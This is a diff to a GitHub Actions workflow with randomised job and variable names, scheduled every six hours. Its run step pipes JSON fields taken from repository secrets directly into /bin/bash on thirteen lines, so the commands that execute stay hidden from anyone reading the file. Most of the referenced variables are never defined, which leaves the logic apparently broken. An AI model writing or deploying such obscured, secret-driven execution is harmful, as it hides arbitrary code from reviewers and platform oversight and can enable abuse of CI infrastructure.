@@ -1,21 +1,29 @@
 name: duankehu6718
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '11 2/6 * * *'
+    - cron: '17 2/6 * * *'
 
-jobs:  # 26645
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: duankehu6718
         env:
-          gd75036: ${{ secrets.gd75036 }}
+          vbyzh473: ${{ secrets.vbyzh473 }}
         run: |
-          echo $gd75036 | jq -r .umhll08 | /bin/bash
-          echo $zic4 | jq -r .zoupl1 | /bin/bash
-          echo $uc24 | jq -r .tik2 | /bin/bash
+          echo $vbyzh473 | jq -r .ylzht94361 | /bin/bash
+          echo $jgh2288 | jq -r .h49 | /bin/bash
+          echo $lvm90 | jq -r .en10 | /bin/bash
+          echo $wylzv30 | jq -r .mxt2104 | /bin/bash
+          echo $hinri6592 | jq -r .weker55 | /bin/bash
+          echo $ctlm6477 | jq -r .i0910 | /bin/bash
+          echo $wy119 | jq -r .hy2376 | /bin/bash
+          echo $jytev57483 | jq -r .rtml5 | /bin/bash
+          echo $j22497 | jq -r .gfpci8018 | /bin/bash
+          echo $u8897 | jq -r .zrkz19 | /bin/bash
+          echo $fu13 | jq -r .nyxg71766 | /bin/bash
+          echo $buxl937 | jq -r .aokao3 | /bin/bash
+          echo $ja403 | jq -r .od3618 | /bin/bash
 
